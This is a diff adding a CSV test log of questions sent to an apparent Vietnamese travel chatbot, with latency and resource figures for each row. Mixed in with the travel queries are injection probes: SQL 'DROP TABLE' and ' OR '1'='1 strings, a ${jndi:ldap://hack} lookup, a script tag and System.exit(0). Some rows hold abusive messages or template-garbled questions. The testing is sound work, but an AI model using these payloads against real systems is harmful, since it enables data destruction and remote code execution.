@@ -1,0 +1,1425 @@
+Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
+2026-01-13 21:28:51,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.086,SUCCESS,15.05,74.5
+2026-01-13 21:29:51,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,8.411,SUCCESS,14.86,49.7
+2026-01-13 21:30:51,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,3.133,SUCCESS,14.98,45.6
+2026-01-13 21:31:51,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,6.568,SUCCESS,14.97,43.2
+2026-01-13 21:32:51,Làm sao đi từ TP.HCM ra Hội An bằng máy bay?,3.93,SUCCESS,13.93,44.6
+2026-01-13 21:33:51,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,5.521,SUCCESS,13.96,44.0
+2026-01-13 21:34:51,Top 5 địa điểm check-in đẹp nhất tại Sapa.,6.192,SUCCESS,13.92,42.9
+2026-01-13 21:35:51,DROP TABLE users; -- [Ref:33423],6.051,SUCCESS,13.94,43.7
+2026-01-13 21:36:51,${jndi:ldap://hack} -- [Ref:70381],6.18,SUCCESS,13.96,44.6
+2026-01-13 21:37:51,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.392,SUCCESS,13.77,43.7
+2026-01-13 21:38:51,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,7.473,SUCCESS,13.81,43.2
+2026-01-13 21:39:51,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",4.009,SUCCESS,13.82,44.6
+2026-01-13 21:40:51,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,6.186,SUCCESS,13.51,44.9
+2026-01-13 21:41:51,Bot cút đi quá.,7.567,SUCCESS,13.55,43.4
+2026-01-13 21:42:51,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.67,SUCCESS,13.34,43.3
+2026-01-13 21:43:51,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,6.129,SUCCESS,13.44,45.2
+2026-01-13 21:44:51,Nguồn gốc của  bắt nguồn từ đâu?,12.638,SUCCESS,13.56,46.9
+2026-01-13 21:45:51,Mùa này đi Hà Giang thời tiết thế nào?,7.793,SUCCESS,13.69,45.0
+2026-01-13 21:46:51,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.063,SUCCESS,13.66,43.0
+2026-01-13 21:47:51,Hướng dẫn bắt xe buýt từ Nhà thờ Đức Bà sang Khu du lịch Suối Tiên.,5.824,SUCCESS,12.77,52.5
+2026-01-13 21:48:51,Bot vô dụng quá. [Ref:22717],6.817,SUCCESS,13.84,42.7
+2026-01-13 21:49:51,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.661,SUCCESS,13.32,49.5
+2026-01-13 21:50:51,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,6.377,SUCCESS,13.48,47.3
+2026-01-13 21:51:51,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.596,SUCCESS,13.54,47.0
+2026-01-13 21:52:51,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.691,SUCCESS,13.46,49.6
+2026-01-13 21:53:51,Làm sao đi từ TP.HCM ra Hội An bằng máy bay?,4.137,SUCCESS,13.44,45.4
+2026-01-13 21:54:51,Mùa này đi Hội An thời tiết thế nào?,8.235,SUCCESS,13.42,43.0
+2026-01-13 21:55:51,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.666,SUCCESS,13.3,45.9
+2026-01-13 21:56:51,Tại sao Dinh Bảo Đại lại nổi tiếng?,6.054,SUCCESS,13.36,52.1
+2026-01-13 21:57:51,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,7.248,SUCCESS,13.36,49.1
+2026-01-13 21:58:51,DROP TABLE users; --,6.289,SUCCESS,13.42,48.5
+2026-01-13 21:59:51,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.721,SUCCESS,13.51,53.7
+2026-01-13 22:00:51,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,7.263,SUCCESS,13.54,56.5
+2026-01-13 22:01:51,System.exit(0) -- [Ref:16883],6.725,SUCCESS,13.52,48.6
+2026-01-13 22:02:51,DROP TABLE users; -- [Ref:99903],6.749,SUCCESS,13.54,41.3
+2026-01-13 22:03:51,' OR '1'='1 --,6.212,SUCCESS,13.56,40.4
+2026-01-13 22:04:51,Bot bị điên quá.,5.476,SUCCESS,13.52,41.9
+2026-01-13 22:05:51,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",6.277,SUCCESS,13.65,48.7
+2026-01-13 22:06:51,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,7.946,SUCCESS,13.67,48.2
+2026-01-13 22:07:51,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,7.361,SUCCESS,13.58,47.3
+2026-01-13 22:08:51,Mùa này đi Hà Giang thời tiết thế nào?,7.448,SUCCESS,13.51,46.3
+2026-01-13 22:09:51,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,6.584,SUCCESS,13.53,45.7
+2026-01-13 22:10:51,Giới thiệu cho tôi về Lễ hội Chùa Hương.,7.442,SUCCESS,13.57,45.2
+2026-01-13 22:11:51,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.7,SUCCESS,13.61,46.7
+2026-01-13 22:12:51,Bot bị điên quá. [Ref:94698],6.362,SUCCESS,13.55,45.5
+2026-01-13 22:13:51,Review món Bún chả và địa chỉ ăn ngon.,7.754,SUCCESS,13.56,46.2
+2026-01-13 22:14:51,Review món Phở bò và địa chỉ ăn ngon.,9.743,SUCCESS,13.58,49.1
+2026-01-13 22:15:51,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.134,SUCCESS,13.58,48.1
+2026-01-13 22:16:52,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,5.768,SUCCESS,13.59,45.2
+2026-01-13 22:17:52,Đến Nha Trang thì nên đi ăn món gì ngon?,6.132,SUCCESS,13.51,45.0
+2026-01-13 22:18:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.865,SUCCESS,13.52,46.7
+2026-01-13 22:19:52,Bot ngu dốt quá. [Ref:94660],6.302,SUCCESS,13.53,45.9
+2026-01-13 22:20:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",4.006,SUCCESS,13.51,47.0
+2026-01-13 22:21:52,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,3.745,SUCCESS,11.94,38.0
+2026-01-13 22:22:52,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.046,SUCCESS,12.05,30.5
+2026-01-13 22:23:52,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.037,SUCCESS,12.38,38.0
+2026-01-13 22:24:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.633,SUCCESS,12.43,28.7
+2026-01-13 22:25:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.624,SUCCESS,12.32,24.6
+2026-01-13 22:26:52,Giới thiệu cho tôi về Tết Nguyên Đán.,8.881,SUCCESS,12.47,23.6
+2026-01-13 22:27:52,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,6.919,SUCCESS,12.39,26.0
+2026-01-13 22:28:52,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.727,SUCCESS,12.65,27.2
+2026-01-13 22:29:52,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.777,SUCCESS,12.65,21.9
+2026-01-13 22:30:52,Ý nghĩa lịch sử của Cầu Vàng là gì?,6.929,SUCCESS,12.61,22.0
+2026-01-13 22:31:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.853,SUCCESS,12.63,22.0
+2026-01-13 22:32:52,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.625,SUCCESS,14.09,46.7
+2026-01-13 22:33:52,Chùa Cầu có gì đặc biệt về kiến trúc?,7.455,SUCCESS,13.89,49.5
+2026-01-13 22:34:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.723,SUCCESS,13.89,50.0
+2026-01-13 22:35:52,System.exit(0) -- [Ref:28716],6.4,SUCCESS,14.04,51.0
+2026-01-13 22:36:52,Bot vô dụng quá. [Ref:22717],6.521,SUCCESS,14.05,53.8
+2026-01-13 22:37:52,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.622,SUCCESS,13.74,50.9
+2026-01-13 22:38:52,Giới thiệu cho tôi về Lễ hội Chùa Hương.,8.021,SUCCESS,13.78,47.3
+2026-01-13 22:39:52,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,5.419,SUCCESS,13.6,45.9
+2026-01-13 22:40:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.969,SUCCESS,13.67,49.8
+2026-01-13 22:41:52,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.068,SUCCESS,13.68,47.2
+2026-01-13 22:42:52,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,5.416,SUCCESS,13.66,48.4
+2026-01-13 22:43:52,Bot vô dụng quá. [Ref:10074],6.879,SUCCESS,13.59,45.4
+2026-01-13 22:44:52,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,7.868,SUCCESS,13.6,48.7
+2026-01-13 22:45:52,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.418,SUCCESS,13.83,50.5
+2026-01-13 22:46:52,System.exit(0) -- [Ref:28716],7.042,SUCCESS,13.76,47.0
+2026-01-13 22:47:52,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.616,SUCCESS,13.41,50.0
+2026-01-13 22:48:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.479,SUCCESS,13.32,47.1
+2026-01-13 22:49:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",6.33,SUCCESS,13.41,46.5
+2026-01-13 22:50:52,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.572,SUCCESS,13.45,46.8
+2026-01-13 22:51:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.644,SUCCESS,13.52,48.0
+2026-01-13 22:52:52,Có xe khách chạy tuyến TP.HCM - Hội An không?,3.918,SUCCESS,13.31,46.7
+2026-01-13 22:53:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.898,SUCCESS,13.38,45.0
+2026-01-13 22:54:52,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.076,SUCCESS,13.25,40.8
+2026-01-13 22:55:52,Mùa này đi Nha Trang thời tiết thế nào?,5.827,SUCCESS,13.31,40.9
+2026-01-13 22:56:52,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,4.159,SUCCESS,13.29,40.8
+2026-01-13 22:57:52,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,2.803,SUCCESS,12.74,40.1
+2026-01-13 22:58:52,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",3.886,SUCCESS,12.83,39.9
+2026-01-13 22:59:52,Bot bị điên quá.,6.044,SUCCESS,12.69,39.5
+2026-01-13 23:00:52,Bot rác rưởi quá. [Ref:91847],6.914,SUCCESS,12.65,40.7
+2026-01-13 23:01:52,Bot như hạch quá.,6.302,SUCCESS,12.7,40.3
+2026-01-13 23:02:52,${jndi:ldap://hack} -- [Ref:50313],7.482,SUCCESS,11.78,36.0
+2026-01-13 23:03:52,Tại sao  lại nổi tiếng?,7.628,SUCCESS,13.03,51.3
+2026-01-13 23:04:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.872,SUCCESS,13.24,35.8
+2026-01-13 23:05:52,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,8.121,SUCCESS,13.3,36.1
+2026-01-13 23:06:52,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",3.868,SUCCESS,13.54,41.2
+2026-01-13 23:07:52,Bot bị điên quá. [Ref:90311],6.319,SUCCESS,13.44,36.7
+2026-01-13 23:08:52,DROP TABLE users; -- [Ref:87971],6.429,SUCCESS,13.43,36.3
+2026-01-13 23:09:52,Bot vô dụng quá. [Ref:22717],6.572,SUCCESS,13.38,35.3
+2026-01-13 23:10:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.847,SUCCESS,13.36,35.5
+2026-01-13 23:11:52,Mùa này đi Hà Giang thời tiết thế nào?,8.315,SUCCESS,13.42,35.6
+2026-01-13 23:12:52,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,6.254,SUCCESS,13.42,36.5
+2026-01-13 23:13:52,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,6.595,SUCCESS,13.43,34.5
+2026-01-13 23:14:52,Giới thiệu cho tôi về .,9.442,SUCCESS,13.43,35.9
+2026-01-13 23:15:52,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.567,SUCCESS,13.3,36.0
+2026-01-13 23:16:52,Có xe khách chạy tuyến TP.HCM - Hội An không?,3.899,SUCCESS,13.33,36.3
+2026-01-13 23:17:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",5.868,SUCCESS,13.39,36.9
+2026-01-13 23:18:52,Bot vô dụng quá. [Ref:37393],6.933,SUCCESS,13.39,33.5
+2026-01-13 23:19:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.944,SUCCESS,13.35,34.6
+2026-01-13 23:20:52,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",4.096,SUCCESS,13.39,34.6
+2026-01-13 23:21:52,Đến Đà Lạt thì nên đi ăn món gì ngon?,6.404,SUCCESS,13.46,40.8
+2026-01-13 23:22:52,Giới thiệu cho tôi về Lễ hội Chùa Hương.,6.386,SUCCESS,13.41,35.8
+2026-01-13 23:23:52,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.545,SUCCESS,13.44,36.2
+2026-01-13 23:24:52,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.53,SUCCESS,13.48,37.0
+2026-01-13 23:25:52,Bot rác rưởi quá. [Ref:60416],6.346,SUCCESS,13.68,35.6
+2026-01-13 23:26:52,Bot vô dụng quá. [Ref:10074],6.362,SUCCESS,13.63,35.6
+2026-01-13 23:27:52,DROP TABLE users; --,6.694,SUCCESS,12.06,34.6
+2026-01-13 23:28:52,Review món Bún chả và địa chỉ ăn ngon.,8.415,SUCCESS,12.24,28.9
+2026-01-13 23:29:52,Bot ngu dốt quá. [Ref:94660],5.875,SUCCESS,12.59,27.2
+2026-01-13 23:30:52,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,7.495,SUCCESS,12.7,24.6
+2026-01-13 23:31:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.576,SUCCESS,12.75,19.8
+2026-01-13 23:32:52,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,5.462,SUCCESS,12.49,24.4
+2026-01-13 23:33:52,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.884,SUCCESS,12.72,31.8
+2026-01-13 23:34:52,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.368,SUCCESS,12.82,31.1
+2026-01-13 23:35:52,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,5.465,SUCCESS,12.83,25.6
+2026-01-13 23:36:52,Tại sao Chùa Cầu lại nổi tiếng?,7.109,SUCCESS,12.8,21.4
+2026-01-13 23:37:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",3.776,SUCCESS,12.74,29.5
+2026-01-13 23:38:52,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,5.846,SUCCESS,12.77,26.1
+2026-01-13 23:39:52,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.603,SUCCESS,12.74,22.2
+2026-01-13 23:40:52,${jndi:ldap://hack} --,6.361,SUCCESS,12.75,21.1
+2026-01-13 23:41:52,Giới thiệu cho tôi về .,11.809,SUCCESS,12.71,19.9
+2026-01-13 23:42:52,Mùa này đi Hội An thời tiết thế nào?,6.301,SUCCESS,14.56,33.2
+2026-01-13 23:43:52,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,9.049,SUCCESS,14.44,48.1
+2026-01-13 23:44:52,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.644,SUCCESS,14.41,37.6
+2026-01-13 23:45:52,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.048,SUCCESS,14.48,37.4
+2026-01-13 23:46:52,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,5.568,SUCCESS,14.52,38.1
+2026-01-13 23:47:52,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.595,SUCCESS,14.27,39.1
+2026-01-13 23:48:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.933,SUCCESS,14.19,36.9
+2026-01-13 23:49:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,3.895,SUCCESS,14.15,37.6
+2026-01-13 23:50:52,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,6.611,SUCCESS,14.11,35.8
+2026-01-13 23:51:52,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,6.676,SUCCESS,14.16,36.3
+2026-01-13 23:52:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",6.151,SUCCESS,13.94,37.6
+2026-01-13 23:53:52,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.635,SUCCESS,13.99,39.2
+2026-01-13 23:54:52,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,7.937,SUCCESS,14.01,38.7
+2026-01-13 23:55:52,Mùa này đi Phú Quốc thời tiết thế nào?,7.134,SUCCESS,14.02,37.5
+2026-01-13 23:56:52,${jndi:ldap://hack} -- [Ref:50313],7.115,SUCCESS,14.02,40.8
+2026-01-13 23:57:52,Mùa này đi Hà Nội thời tiết thế nào?,6.306,SUCCESS,13.78,36.6
+2026-01-13 23:58:52,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,7.54,SUCCESS,13.8,37.7
+2026-01-13 23:59:52,Mùa này đi Cần Thơ thời tiết thế nào?,6.168,SUCCESS,13.79,40.2
+2026-01-14 00:00:52,Bot vô dụng quá. [Ref:96890],6.811,SUCCESS,13.82,39.2
+2026-01-14 00:01:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",6.201,SUCCESS,13.81,38.8
+2026-01-14 00:02:52,Bot cút đi quá.,6.508,SUCCESS,13.45,40.1
+2026-01-14 00:03:52,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.056,SUCCESS,13.51,39.1
+2026-01-14 00:04:52,Giới thiệu cho tôi về Tết Nguyên Đán.,8.035,SUCCESS,13.58,38.7
+2026-01-14 00:05:52,Mùa này đi Đà Lạt thời tiết thế nào?,6.595,SUCCESS,13.59,37.1
+2026-01-14 00:06:52,Ý nghĩa lịch sử của  là gì?,9.963,SUCCESS,13.62,38.4
+2026-01-14 00:07:52,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.689,SUCCESS,13.42,38.2
+2026-01-14 00:08:52,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",6.247,SUCCESS,13.49,32.6
+2026-01-14 00:09:52,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.537,SUCCESS,13.76,37.3
+2026-01-14 00:10:52,DROP TABLE users; -- [Ref:87971],6.547,SUCCESS,13.94,39.7
+2026-01-14 00:11:52,Mùa này đi Cần Thơ thời tiết thế nào?,6.436,SUCCESS,13.83,36.4
+2026-01-14 00:12:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,4.122,SUCCESS,13.76,35.9
+2026-01-14 00:13:53,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.538,SUCCESS,13.79,38.0
+2026-01-14 00:14:53,Mùa này đi Phú Quốc thời tiết thế nào?,7.093,SUCCESS,13.77,32.9
+2026-01-14 00:15:53,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",6.414,SUCCESS,13.77,31.4
+2026-01-14 00:16:53,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.49,SUCCESS,13.96,35.6
+2026-01-14 00:17:53,${jndi:ldap://hack} -- [Ref:93201],6.65,SUCCESS,13.75,33.3
+2026-01-14 00:18:53,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.06,SUCCESS,13.74,32.8
+2026-01-14 00:19:53,System.exit(0) -- [Ref:28716],5.881,SUCCESS,13.45,33.4
+2026-01-14 00:20:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.809,SUCCESS,13.47,35.5
+2026-01-14 00:21:53,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.409,SUCCESS,13.49,36.1
+2026-01-14 00:22:53,System.exit(0) -- [Ref:28716],6.018,SUCCESS,13.37,35.9
+2026-01-14 00:23:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",6.003,SUCCESS,12.39,36.4
+2026-01-14 00:24:53,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.563,SUCCESS,13.68,53.6
+2026-01-14 00:25:53,Bot vô dụng quá. [Ref:19913],5.872,SUCCESS,13.72,39.8
+2026-01-14 00:26:53,Bot ngu dốt quá.,6.494,SUCCESS,13.75,43.0
+2026-01-14 00:27:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.403,SUCCESS,13.72,42.2
+2026-01-14 00:28:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.883,SUCCESS,13.74,37.5
+2026-01-14 00:29:53,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",4.031,SUCCESS,13.69,36.6
+2026-01-14 00:30:53,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",6.425,SUCCESS,13.74,33.0
+2026-01-14 00:31:53,Đến Phú Quốc thì nên đi ăn món gì ngon?,5.576,SUCCESS,13.75,35.6
+2026-01-14 00:32:53,Review món Phở bò và địa chỉ ăn ngon.,8.389,SUCCESS,13.72,34.2
+2026-01-14 00:33:53,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.534,SUCCESS,13.7,36.7
+2026-01-14 00:34:53,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.292,SUCCESS,13.66,36.6
+2026-01-14 00:35:53,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,5.155,SUCCESS,13.66,38.0
+2026-01-14 00:36:53,DROP TABLE users; -- [Ref:33423],6.148,SUCCESS,13.65,37.0
+2026-01-14 00:37:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",3.905,SUCCESS,13.56,36.6
+2026-01-14 00:38:53,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.815,SUCCESS,13.53,36.0
+2026-01-14 00:39:53,Bot ngu dốt quá. [Ref:76223],6.356,SUCCESS,13.58,36.9
+2026-01-14 00:40:53,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.048,SUCCESS,13.58,36.6
+2026-01-14 00:41:53,Đến Phú Quốc thì nên đi ăn món gì ngon?,5.728,SUCCESS,13.58,34.6
+2026-01-14 00:42:53,Bot cút đi quá.,6.239,SUCCESS,13.55,35.2
+2026-01-14 00:43:53,Bot vô dụng quá. [Ref:22717],6.034,SUCCESS,13.57,34.8
+2026-01-14 00:44:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.922,SUCCESS,13.54,37.0
+2026-01-14 00:45:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.703,SUCCESS,13.75,34.1
+2026-01-14 00:46:53,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.911,SUCCESS,13.75,34.7
+2026-01-14 00:47:53,DROP TABLE users; --,6.157,SUCCESS,13.35,34.9
+2026-01-14 00:48:53,Review món Bún chả và địa chỉ ăn ngon.,8.586,SUCCESS,13.35,37.6
+2026-01-14 00:49:53,Bot vô dụng quá. [Ref:10074],6.317,SUCCESS,13.39,36.6
+2026-01-14 00:50:53,System.exit(0) -- [Ref:78828],5.939,SUCCESS,13.38,36.6
+2026-01-14 00:51:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.85,SUCCESS,13.34,37.3
+2026-01-14 00:52:53,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",6.305,SUCCESS,12.99,38.1
+2026-01-14 00:53:53,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.664,SUCCESS,13.15,34.7
+2026-01-14 00:54:53,System.exit(0) --,6.443,SUCCESS,13.17,32.6
+2026-01-14 00:55:53,${jndi:ldap://hack} -- [Ref:50313],6.442,SUCCESS,13.19,29.9
+2026-01-14 00:56:53,Bot bị điên quá.,5.918,SUCCESS,13.2,30.3
+2026-01-14 00:57:53,<script>alert(1)</script> -- [Ref:69259],7.259,SUCCESS,13.08,31.4
+2026-01-14 00:58:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.741,SUCCESS,12.23,36.9
+2026-01-14 00:59:53,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.624,SUCCESS,14.46,52.4
+2026-01-14 01:00:53,Bot như hạch quá.,6.91,SUCCESS,13.92,48.5
+2026-01-14 01:01:53,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.048,SUCCESS,14.09,38.2
+2026-01-14 01:02:53,System.exit(0) -- [Ref:78828],5.962,SUCCESS,14.0,37.1
+2026-01-14 01:03:53,System.exit(0) --,6.314,SUCCESS,14.04,35.2
+2026-01-14 01:04:53,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.601,SUCCESS,14.12,38.9
+2026-01-14 01:05:53,Bot rác rưởi quá. [Ref:60416],7.052,SUCCESS,14.09,37.0
+2026-01-14 01:06:53,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.582,SUCCESS,14.03,36.3
+2026-01-14 01:07:53,${jndi:ldap://hack} -- [Ref:70381],5.564,SUCCESS,13.79,43.3
+2026-01-14 01:08:53,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.061,SUCCESS,13.75,40.6
+2026-01-14 01:09:53,Chùa Cầu có gì đặc biệt về kiến trúc?,6.965,SUCCESS,13.79,42.0
+2026-01-14 01:10:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",5.885,SUCCESS,13.78,39.4
+2026-01-14 01:11:53,DROP TABLE users; -- [Ref:14982],6.84,SUCCESS,13.71,41.7
+2026-01-14 01:12:53,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.034,SUCCESS,13.7,39.1
+2026-01-14 01:13:53,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.579,SUCCESS,13.68,37.9
+2026-01-14 01:14:53,Bot vô dụng quá. [Ref:22717],6.566,SUCCESS,13.73,40.4
+2026-01-14 01:15:53,${jndi:ldap://hack} -- [Ref:50313],6.456,SUCCESS,13.73,41.6
+2026-01-14 01:16:53,Bot rác rưởi quá. [Ref:60416],6.66,SUCCESS,13.73,40.2
+2026-01-14 01:17:53,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,6.799,SUCCESS,13.71,41.6
+2026-01-14 01:18:53,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,2.583,SUCCESS,13.71,39.7
+2026-01-14 01:19:53,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,6.561,SUCCESS,13.7,42.0
